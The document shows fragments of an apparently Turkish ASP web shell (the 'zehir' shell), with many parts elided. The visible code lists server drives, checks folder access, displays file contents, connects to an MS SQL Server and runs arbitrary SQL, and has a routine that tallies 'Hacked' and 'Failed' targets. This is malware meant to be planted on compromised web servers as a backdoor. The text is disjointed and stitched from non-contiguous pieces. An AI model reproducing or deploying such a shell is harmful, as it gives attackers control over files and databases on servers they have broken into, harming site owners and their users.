...
if Request("kuskapani")=2 then
    ...
    Next
    ss___ = now
    response.Write "<br><font color=white>by zehir!...</font><br><b>Sonuc : </b> Toplam Sre : "&left(ss__-ss___,5)&"sn. ;)<br><font color=blue>Hacked</font> = "&h__&"<br><font color=red>Failed</font> = "&f__
    response.End
end if
...
sub LocalPathParentFolder
    ...
    if err<>0 then
        Response.Write "<tr><td><b>Local Path <br>Parent Folder</td><td><font color=red>Hata Olutu : ["&err.Description&"]</td></tr>"
    else
...
sub LocalPathPParentFolder
    ...
    if err<>0 then
        if err=451 then
            ...
            Response.Write "<tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=red>Hata Olutu : ["&err.Description&"]</td></tr>"
        end if
    else
...
CASE 15 'Ms. SQL Server
    ...
    Response.Write "<table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server iin connection string giriniz</td></tr><tr><td align=center>"
    ...
    response.Write "<input type=submit value='SQL Servera Balan' style='height:23;width:170' id=submit1 name=submit1>"
...
CASE 33 'Powered By
    ...
    response.Write "<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier new'>kll nefsun zaifetun mevt"
    popup = false
    hataKontrol
CASE 40 'Sistem Test
    sistemTest
                    ...
                    <table width=500 align=center border=1 cellpadding=0 cellspacing=0>
                        ...
                        <tr>
                            <td colspan=2 align=center>
                                ...
                                <a href="#" onClick="FormatText('paste')" alt="Yaptr">Yaptr</a>
                                <a href="#" alt="Kaln" onClick="FormatText('bold', '')">Bold</a>
                                ...
                                <a href="#" onClick="FormatText('JustifyRight', '')" alt="Saa Hizal">JustifyRight</a>
                                ...
                                <select name="selectColour" onChange="bgc(selectColour.options[selectColour.selectedIndex].value);" ID="selectColour">
                                  ...
                                  <option value="cyan">Ak Mavi</option>
                                  <option value="limegreen">Ak Yeil</option>
                                </select>
                                ...
                                <script language=javascript>
                                    ...
                                    function AddImage(){
                                        imagePath = prompt('Eklemek istediiniz resmin web adresini yazn', 'http://');
...
if popup then
    if status=7 or status=8 then
        Response.Write "<form method=get action='"&DosyPath&"' id=form1 name=form1>"
        Response.Write "<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL altr</td><td>"
        ...
        Response.Write "<input style='width:350; height:21' value='' name=strSQL><input type=submit value='altr' style='height:22;width:70' id=submit1 name=submit1>"
...
CASE 5 'Dosya ieriini grntle
    ...
    if err.number=62 then Response.Write "<script language=javascript>alert('Bu Dosya Okunamyor\nSistem dosyas olabilir')</script>":Response.End
CASE 6 'Resim a
...
on error resume next
    ...
    if yaziyomu2(lpath_) then
        ...
        Response.Write("Resim Alamyor.. <br>sterseniz Download Ederek grntleyebilirsiniz..")
    end if
    resimYol = fname__
end function
...
%><script language=javascript>
	...
	<%
	Response.Write "<table align=center border=1 width=150 cellpadding=0 cellspacing=0><tr bgcolor=gray><td align=center><b><font color=white>Srcler</td></tr>"
	for each drive_ in objFSO.Drives
